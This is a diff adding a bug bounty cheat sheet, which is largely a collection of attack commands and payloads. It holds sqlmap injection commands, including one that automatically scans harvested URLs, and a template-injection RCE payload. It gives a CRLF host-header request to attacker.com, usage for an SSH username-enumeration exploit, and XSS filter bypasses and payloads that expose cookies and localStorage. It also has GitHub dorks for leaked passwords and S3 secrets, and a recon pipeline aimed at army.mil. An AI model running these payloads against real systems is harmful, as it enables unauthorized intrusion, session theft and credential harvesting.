@@ -1,0 +1,155 @@
+########################################################################
+#								       #
+#								       #
+#								       #
+#	bug bounty tips and tricks				       #
+#		collected form the com     			       #
+#								       #
+########################################################################
+
+- recon and trying to get much information about the target
+########################################################################
+Hitting non-stop criticals with js files
+My old tweet about 13 crits in one day
+
+1. Grabbed .min.js files from source codes
+2. Pasted whole js code in https://unminify.com
+3. Used paramfinder over unminified js file
+4. Testing: Command Injection, SSRF, IDOR etc
+___________________________________________
+*try login with admin admin and send login request  to burp
+*do an active scan
+if show SQL injection with parameter 
+#POC 
+copy request in txt 
+and on sqlmap 
+sqlmap -r sql.txt --force-ssl --level 5 --risk 3 --dbs -p parameter
+____________________________________________
+go to shodan.io
+ Try 
+ssl:target.* 200
+Try
+http://Ssl.cert.subject.CN:"target.*" 200
+What that help?
+1 found related domains and ips 
+1 found admin panels
+All the time try 
+Default Credentials
+_______________________________
+test : 
+POST /object/1 HTTP/1.1
+Host: http://target.org
+X-HTTP-Method-Override: DELETE/PUT
+_______________________________
+try rce
+Request:
+POST /search/
+
+keys={if:array_map(base_convert(27440799224,10,32),array(1))}{end if}
+__________________________________
+check if domain is available for purchase 
+https://github.com/m4ll0k/Bug-Bounty-Toolz/blob/master/availableForPurchase.py
+_____________________________________
+try 
+GET /docs/%20HTTP/1.1%0d%0aHost:http://attacker.com%0d%0a%0d%0a HTTP/1.1 
+Host: http://target.com
+_______________________________________
+First thing I do when I start is
+
+ "{" OR ":"  OR "/}/" site:http://target.com
+
+"safemode: hdd: workgroup:" AND "coded by" link/site:http://target.com
+
+ "*conf*" OR "*XML*"site:http://target.com
+
+-support -blog -faq -help -bugzilla -dev -community -docs -issues
+____________________________________
+POST /endpoint/ HTTP 1.1
+Host: http://evil.com
+
+Response: 403, 404
+
+Bypass:
+POST /https://endpoint/ HTTP 1.1
+Host: http://evil.com
+
+Response: 200, 302
+_______________________________________
+Steps :
+
+1. Found an IP of the company eg: http://testing.com then  cloned the CVE from https://github.com/Rhynorater/CVE-2018-15473-Exploit/blob/master/sshUsernameEnumExploit.py
+
+2. Ran the command 
+ /sshUsernameEnumExploit.py --username root 0.0.0.0 (ip)
+_______________________________________
+########################################################################
+https://orwaatyat.medium.com/your-full-map-to-github-recon-and-leaks-exposure-860c37ca2c82
+########################################################################
+recon finding subdomain and some cool automation :
+tools : 
+Phpvuln - Audit Tool To Find Common Vulnerabilities In PHP Source Code
+https://github.com/ecriminal/phpvuln
+resources : 
+https://github.com/KingOfBugbounty/KingOfBugBountyTips
+https://dhiyaneshgeek.github.io/bug/bounty/2020/02/06/recon-with-me/
+https://medium.com/heck-the-packet/subdomain-enumeration-a-comparison-of-paid-services-c29cb071900f
+for quick automation :
+get all js files 
+use cat domain | rush 'assetfinder -subs-only {}' | httpx -silent | getJS --complete
+use : chaos -d http://army.mil -silent | rush 'assetfinder -subs-only {}' | httpx -silent | getJS --complete
+https://github.com/theinfosecguy/QuickXSS
+use : findomain -t http://testphp.vulnweb.com -q | httpx -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli --batch --random-agent --level 1
+Spider all links then get js files and find any attributes, replace after = mark with xxs code. (Reflected xss) 
+use : gospider -S domain.txt -t 3 -c 100 |  tr " " "\n" | grep -v ".js" | grep "https://" | grep "=" | qsreplace '%22><svg%20onload=confirm(1);>'
+########################################################################
+payloads : 
+Cloudflare XSS bypass in input tag :
+Payload :
+ onfocus=alert&#x00000000028;1&#x00000000029; autofocus>
+______________________________________________
+a Javascript Polyglot for Cross-Site Scripting (XSS) Shield
+
+<video src=">" onerror=setTimeout`confirm\x281\x29`>
+_______________________________________________
+xss payload for password 
+%01%E2%80%AEalert%0D%0A 
+<svg onx=() onload=(confirm)(1)>
+
+<svg onx=() onload=(confirm)(document.cookie)>
+
+<svg onx=() onload=(confirm)(JSON.stringify(localStorage))>
+<img/src/onerror=alert("XSS")>
+"><img src onerror=alert(1)>
+"autofocus onfocus=alert(1)//
+</script><script>alert(1)</script>
+'-alert(1)-'
+\'-alert(1)//
+javascript:alert(1)
+sql /?q=1"
+/?q=[1]
+/?q[]=1
+/?q=1`
+/?q=1\
+/?q=1/*'*/
+/?q=1/*!1111'*/
+/?q=1'||'asd'||'   <== concat string
+/?q=1' or '1'='1
+/?q=1 or 1=1
+/?q='or''='
+<svg onload=alert%26%230000000040"1")>
+___________________________________________
+########################################################################
+dorks :
+go github
+#tip 
+"http://Target.com" language:js password
+____________________
+github s3 bucket
+S3_USER_SECRET=
+S3_KEY_ASSETS=
+http://S3.AMAZONAWS.COM=
+S3_KEY_APP_LOGS=
+S3_BUCKET_NAME_APP_LOGS=
+________________________________________
+
+
